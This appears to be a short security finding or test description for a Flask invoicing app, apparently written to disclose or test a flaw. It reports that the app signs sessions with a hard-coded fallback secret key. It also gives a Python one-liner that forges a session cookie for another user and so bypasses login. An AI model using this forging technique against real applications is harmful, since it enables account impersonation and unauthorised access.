description: With no SECRET_KEY in the environment the app signs sessions with the key hard-coded at invoicer/__init__.py:11. A cookie for user_id 2 (bob), signed with that key, is accepted without logging in. Generate it with: python -c "from flask import Flask; from flask.sessions import SecureCookieSessionInterface as S; a = Flask('x'); a.secret_key = '<value at invoicer/__init__.py:11>'; print(S().get_signing_serializer(a).dumps({'user_id': 2}))" and export it as FORGED_SESSION.
